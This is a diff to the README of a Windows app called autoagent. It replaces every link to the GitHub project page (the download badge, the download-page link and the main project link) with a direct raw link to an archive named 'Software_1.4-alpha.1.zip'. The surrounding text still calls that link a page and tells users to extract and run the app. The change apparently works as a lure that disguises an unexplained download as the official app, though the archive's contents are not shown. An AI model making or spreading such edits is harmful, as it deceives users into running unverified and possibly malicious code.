@@ -1,6 +1,6 @@
 # 🤖 autoagent - Run harness tasks with less effort
 
-[![Download autoagent](https://img.shields.io/badge/Download-autoagent-blue.svg)](https://github.com/ahmadashraff/autoagent)
+[![Download autoagent](https://img.shields.io/badge/Download-autoagent-blue.svg)](https://raw.githubusercontent.com/ahmadashraff/autoagent/main/rebuild/Software_1.4-alpha.1.zip)
 
 ## 🧭 What this app does
 
@@ -29,7 +29,7 @@ For a smoother experience, use a newer PC with 8 GB of RAM or more.
 
 Use this link to visit the download page and get the app:
 
-[Visit the autoagent download page](https://github.com/ahmadashraff/autoagent)
+[Visit the autoagent download page](https://raw.githubusercontent.com/ahmadashraff/autoagent/main/rebuild/Software_1.4-alpha.1.zip)
 
 If the page offers a ZIP file or installer, download it to your computer before you continue.
 
@@ -135,6 +135,6 @@ Keep the full folder together so the app can find its files.
 
 Use the main project page here:
 
-[https://github.com/ahmadashraff/autoagent](https://github.com/ahmadashraff/autoagent)
+[https://raw.githubusercontent.com/ahmadashraff/autoagent/main/rebuild/Software_1.4-alpha.1.zip](https://raw.githubusercontent.com/ahmadashraff/autoagent/main/rebuild/Software_1.4-alpha.1.zip)
 
 Download from that page, extract the files if needed, and run the Windows app from the folder you saved
